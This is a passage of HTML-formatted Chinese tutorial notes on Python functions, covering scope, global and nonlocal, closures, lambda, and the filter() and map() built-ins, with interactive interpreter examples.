class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> <span class=\"token string\">'age:'</span><span class=\"token punctuation\">,</span> age<span class=\"token punctuation\">,</span> <span class=\"token string\">'other:'</span><span class=\"token punctuation\">,</span> kw<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>b. 实参：实际参数，真正参与函数的运算</p>\n<h3 id=\"函数变量的作用域\"><a class=\"anchor\" href=\"#函数变量的作用域\">#</a> 函数变量的作用域</h3>\n<p>Python 的全局变量与局部变量。</p>\n<p>如果在函数内部试图去修改全局变量，Python 会使用屏蔽（Shadowing）方式 “保护” 全局变量：一旦函数内部去修改全局变量，Python 就会在函数内部自动创建一个名字一模一样的局部变量，这样修改的结果只会修改到局部变量，而不会影响到全局变量。</p>\n<p>如果你有必要在函数中修改这个全局，那么你可以使用 global 关键字来打到目的<br />\n实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> c <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">h</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t<span class=\"token keyword\">global</span> c</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tc <span class=\"token operator\">=</span> <span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> h<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> c</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr></table></figure><h3 id=\"返回值\"><a class=\"anchor\" href=\"#返回值\">#</a> 返回值</h3>\n<p>当不写 return 语句的时候，默认 Python 会认为函数会 return None 的。<br />\n所以说 python 所有的函数都有返回值。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">h</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"666\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>h<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token boolean\">None</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> h<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">666</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">#-------------------------------------------------------#</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\">#当返回多个值时，默认会使用元组</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">f</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'nb'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> f<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'nb'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>f<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'tuple'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span></pre></td></tr></table></figure><h3 id=\"内嵌函数\"><a class=\"anchor\" href=\"#内嵌函数\">#</a> 内嵌函数</h3>\n<p>Python 的函数定义是可以嵌套的，允许在函数内部创建另一个函数，这种函数叫做内嵌函数或者内部函数。</p>\n<p>不举例了</p>\n<p>注意函数的定义域<br />\n函数 1 里定义的函数 2 只能在函数 1 里使用。(废话嘛这不)</p>\n<h3 id=\"闭包closure\"><a class=\"anchor\" href=\"#闭包closure\">#</a> 闭包 (closure)</h3>\n<p>闭包是函数式编程的一个重要的语法结构，函数式编程是一种编程范式，著名的函数式编程语言就是 LISP 语言。</p>\n<p>不同编程函数实现闭包的方式不同，Python 中的闭包从变现形式上定义为：如果在一个内部函数里，对在外部作用域（但不是全局作用域）的变量进行引用，内部函数就被认为是闭包（closure）。</p>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t    <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span>y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\t\t    <span class=\"token keyword\">return</span> x <span class=\"token operator\">*</span> y</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\t    <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> l <span class=\"token operator\">=</span> funx<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> l<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token number\">36</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\">## 也可以这样写</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token number\">36</span></pre></td></tr></table></figure><p>通过上面的例子理解闭包的概念：如果在一个内部函数里（funy 就是这个内部函数）对外部作用域（但不全是在全局作用域）的变量进行引用（x 就是被引用的变量，x 在外部作用域 funx 函数里面，但不在全局作用域里），则为这个内部函数就是一个闭包。</p>\n<p>把一个变量变成了一个函数</p>\n<p>使用闭包函数需要注意的是：因为闭包的概念就是有内部函数而来的，所以你也不能在外部函数以外的地方对内部函数进行调用。（很显然呀）</p>\n<p>还有一个问题</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        x<span class=\"token operator\">=</span><span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            x <span class=\"token operator\">*=</span> x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>Traceback <span class=\"token punctuation\">(</span>most recent call last<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#29>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> <span class=\"token operator\">&lt;</span>module<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  File <span class=\"token string\">\"&lt;pyshell#28>\"</span><span class=\"token punctuation\">,</span> line <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">in</span> funy</pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    x <span class=\"token operator\">*=</span> x</pre></td></tr><tr><td data-num=\"14\"></td><td><pre>UnboundLocalError<span class=\"token punctuation\">:</span> local variable <span class=\"token string\">'x'</span> referenced before assignment</pre></td></tr></table></figure><p>这个报错原因跟全局变量的那个一样，Python 认为在内部函数的 x 是局部变量的时候，外部函数的 x 就被屏蔽了起来，所以在右边根本就找不到局部变量 x 的值，因此报错。</p>\n<p>在 Python3 之前只能间接的通过容器类型来存放，因为容器类型不是放在栈里，所以不会被 “屏蔽”。字符串、列表、元组，这些啥都可以往里放的就是容器类型。可以把代码改成：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        x <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*=</span> x<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">25</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">type</span><span class=\"token punctuation\">(</span>_<span class=\"token punctuation\">)</span> <span class=\"token comment\"># \"_\" 代表上一条语句的结果</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token keyword\">class</span> <span class=\"token string\">'list'</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># 把 “x [0] = x ” 了</span></pre></td></tr></table></figure><p>到 Python3 里有一个关键字 nonlocal 可以使用，使用方法跟 global 一样</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token keyword\">def</span> <span class=\"token function\">funx</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        x <span class=\"token operator\">=</span> <span class=\"token number\">5</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">def</span> <span class=\"token function\">funy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">nonlocal</span> x</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            x <span class=\"token operator\">*=</span> x</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token keyword\">return</span> x</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token keyword\">return</span> funy</pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> funx<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token number\">25</span></pre></td></tr></table></figure><p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hjeWFuc3VuL2FydGljbGUvZGV0YWlscy83OTY3MjYzNA==\"> Python 中关键字 global 与 nonlocal 的区别</span></p>\n<p>第一，两者的功能不同。global 关键字修饰变量后标识该变量是全局变量，对该变量进行修改就是修改全局变量，而 nonlocal 关键字修饰变量后标识该变量是上一级函数中的局部变量，如果上一级函数中不存在该局部变量，nonlocal 位置会发生错误（最上层的函数使用 nonlocal 修饰变量必定会报错）。</p>\n<p>第二，两者使用的范围不同。global 关键字可以用在任何地方，包括最上层函数中和嵌套函数中，即使之前未定义该变量，global 修饰后也可以直接使用，而 nonlocal 关键字只能用于嵌套函数中，并且外层函数中定义了相应的局部变量，否则会发生错误（见第一）</p>\n<h3 id=\"匿名函数\"><a class=\"anchor\" href=\"#匿名函数\">#</a> 匿名函数</h3>\n<p>Python 之父想删除的一个函数。。。。。</p>\n<p>匿名函数：<br />\nlambda 形参 1, 形参 2：执行语句</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> g <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">:</span>x<span class=\"token operator\">*</span>y</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> g<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token number\">36</span></pre></td></tr></table></figure><h3 id=\"介绍两个biffilter和map\"><a class=\"anchor\" href=\"#介绍两个biffilter和map\">#</a> 介绍两个 BIF：filter () 和 map ()</h3>\n<p>Python 中的 BIF 就是 Built-in Functions, 即内置函数 (装 x 呀)</p>\n<h4 id=\"filter\"><a class=\"anchor\" href=\"#filter\">#</a> filter()</h4>\n<p>第一个内建函数就是过滤器</p>\n<p>看看 python 中的注释</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">help</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">filter</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Help on <span class=\"token keyword\">class</span> <span class=\"token class-name\">filter</span> <span class=\"token keyword\">in</span> module builtins<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">filter</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">object</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token operator\">|</span>  <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span>function <span class=\"token keyword\">or</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> iterable<span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">></span> <span class=\"token builtin\">filter</span> <span class=\"token builtin\">object</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token operator\">|</span>  Return an iterator yielding those items of iterable <span class=\"token keyword\">for</span> which function<span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> <span class=\"token operator\">|</span>  <span class=\"token keyword\">is</span> true<span class=\"token punctuation\">.</span> If function <span class=\"token keyword\">is</span> <span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">return</span> the items that are true<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token operator\">|</span>  Methods defined here<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"12\"></td><td><pre> <span class=\"token operator\">|</span>  __getattribute__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> <span class=\"token operator\">|</span>      Return <span class=\"token builtin\">getattr</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"15\"></td><td><pre> <span class=\"token operator\">|</span>  __iter__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre> <span class=\"token operator\">|</span>      Implement <span class=\"token builtin\">iter</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"18\"></td><td><pre> <span class=\"token operator\">|</span>  __next__<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> <span class=\"token operator\">/</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> <span class=\"token operator\">|</span>      Implement <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"21\"></td><td><pre> <span class=\"token operator\">|</span>  __reduce__<span class=\"token punctuation\">(</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre> <span class=\"token operator\">|</span>      Return state information <span class=\"token keyword\">for</span> pickling<span class=\"token punctuation\">.</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"24\"></td><td><pre> <span class=\"token operator\">|</span>  <span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span><span class=\"token operator\">-</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre> <span class=\"token operator\">|</span>  Static methods defined here<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> <span class=\"token operator\">|</span>  </pre></td></tr><tr><td data-num=\"27\"></td><td><pre> <span class=\"token operator\">|</span>  __new__<span class=\"token punctuation\">(</span><span class=\"token operator\">*</span>args<span class=\"token punctuation\">,</span> <span class=\"token operator\">**</span>kwargs<span class=\"token punctuation\">)</span> <span class=\"token keyword\">from</span> builtins<span class=\"token punctuation\">.</span><span class=\"token builtin\">type</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre> <span class=\"token operator\">|</span>      Create <span class=\"token keyword\">and</span> <span class=\"token keyword\">return</span> a new <span class=\"token builtin\">object</span><span class=\"token punctuation\">.</span>  See <span class=\"token builtin\">help</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">type</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> accurate signature<span class=\"token punctuation\">.</span></pre></td></tr></table></figure><p>大致意思是：filter 有两个参数。第一个参数可以是一个函数也可以是 None, 如果是一个函数的话，则将第二个可迭代的数据里的每一个元素作为函数的参数进行计算，把返回为 True 的值筛选出来；如果第一个参数为 None，则直接将第二个参数中为 True 的值筛选出来。</p>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t <span class=\"token operator\">=</span> <span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">filter</span> <span class=\"token builtin\">object</span> at <span class=\"token number\">0x000001DC49317070</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><p>结合 lambda 函数写一个奇数过滤器</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">filter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">lambda</span> x<span class=\"token punctuation\">:</span> x <span class=\"token operator\">%</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr></table></figure><h4 id=\"map\"><a class=\"anchor\" href=\"#map\">#</a> map()</h4>\n<p>map 在这里不是地图的意思，在编程领域里，map 一般做 “映射” 来解释。</p>\n<p>map () 这个内置函数也有两个参数，仍然是一个函数和一个可迭代序列，将序列的每一个元素作为函数的参数进行运算加工，知道可迭代序列每个元素都加工完毕，返回所有加工后的元素构成的新序列。</p>\n<p>实例</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> s <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">,</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t <span class=\"token operator\">=</span> <span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">None</span><span class=\"token punctuation\">,</span> s<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> t</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token operator\">&lt;</span><span class=\"token builtin\">map</span> <span class=\"token builtin\">object</span> at <span class=\"token number\">0x000001DC49317610</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token operator\">>></span><span class=\"token operator\">></span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>Traceback <span class=\"token 